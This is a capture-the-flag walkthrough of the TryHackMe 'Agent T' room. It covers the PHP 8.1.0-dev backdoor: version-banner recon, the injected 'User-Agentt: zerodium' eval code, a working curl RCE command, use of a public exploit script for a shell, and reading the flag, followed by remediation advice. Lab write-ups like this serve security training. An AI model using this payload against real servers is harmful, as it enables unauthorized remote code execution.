# TryHackMe CTF Walkthrough: Agent T

**Vulnerability Explored:** PHP 8.1.0-dev backdoor — unauthenticated Remote Code Execution (RCE) via the `User-Agentt` header

> **🚩 At a glance** — *TryHackMe · Agent T (Web)*
> **Tools:** Browser DevTools · curl · Python exploit script
> **Skills:** HTTP header inspection, version-banner recon, RCE exploitation, post-exploitation file read
> **Flag:** `flag{REDACTED}`

## Scenario Overview
> *"Agent T uncovered this website, which looks innocent enough, but something seems off about how the server responds..."*

The goal is to investigate the web server, spot the misconfiguration in how it responds, achieve Remote Code Execution, and retrieve the flag.

## Step 1: Reconnaissance & HTTP Header Inspection
Browsing to the target loads an **Admin Dashboard** (SB Admin 2 template) with no obvious login forms or dynamic inputs:
```
http://10.114.132.225/
```
Opening **Developer Tools** (`F12`) → **Network** tab, reloading, and inspecting the response headers of the root document reveals the giveaway:
```http
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8
```

*Key finding:* The server advertises `X-Powered-By: PHP/8.1.0-dev` — a development build of PHP that ships with a well-known supply-chain backdoor.

## Step 2: Vulnerability Analysis (PHP 8.1.0-dev Backdoor)
On **March 28, 2021**, two malicious commits were pushed directly to the official `php-src` Git repository, spoofed under the names of PHP creator **Rasmus Lerdorf** and core maintainer **Nikita Popov** and disguised as minor typo fixes.

The injected code checks incoming requests for a non-standard header named `User-Agentt` (note the double `t`). If its value starts with the keyword `zerodium`, the server passes everything after that keyword straight to PHP's evaluation engine:
```c
zend_eval_string(header_value + 8, NULL, "User-Agentt");
```
This gives any client that sends the crafted header **unauthenticated, arbitrary Remote Code Execution**.

## Step 3: Exploitation

### Manual Exploitation via curl
Commands can be run directly by setting the `User-Agentt` header:
```bash
curl -H "User-Agentt: zerodiumsystem('id');" http://10.114.132.225/
```

### Interactive Shell via Python Exploit
Alternatively, an existing exploit script gives an interactive pseudo-shell:
```bash
git clone https://github.com/K3ysTr0K3R/PHP-8.1.0-dev-Backdoor.git
cd PHP-8.1.0-dev-Backdoor
python3 exploit.py -u http://10.114.132.225/
```
```text
[+] Interactive shell active on: http://10.114.132.225/
[!] Type 'exit' or 'quit' to close.

$:
```

## Step 4: Post-Exploitation & Flag Retrieval
Listing the web root, then traversing up to `/`, shows `flag.txt` sitting at the filesystem root:
```bash
$: ls ../../../
bin  boot  dev  etc  flag.txt  home  lib  ...  usr  var
```
Reading it reveals the flag:
```bash
$: cat ../../../flag.txt
flag{REDACTED}
```

### Final Flag
**`flag{REDACTED}`**

***

## Remediation & Mitigation
1. **Update PHP:** Move off the `-dev` snapshot to a stable, official release (PHP 8.1.x stable or later).
2. **Hide the version banner:** Set `expose_php = Off` in `php.ini` to stop leaking the runtime version via `X-Powered-By`.
3. **WAF rules:** Inspect and strip non-standard headers such as `User-Agentt`.
4. **Supply-chain security:** Deploy only signed, tagged official releases — never unreviewed development snapshots in production or staging.

**Key Takeaway:** A leaked version banner (`X-Powered-By: PHP/8.1.0-dev`) was enough to identify a backdoored build and gain instant RCE with a single header. Suppress version disclosure and never run development snapshots in a reachable environment.
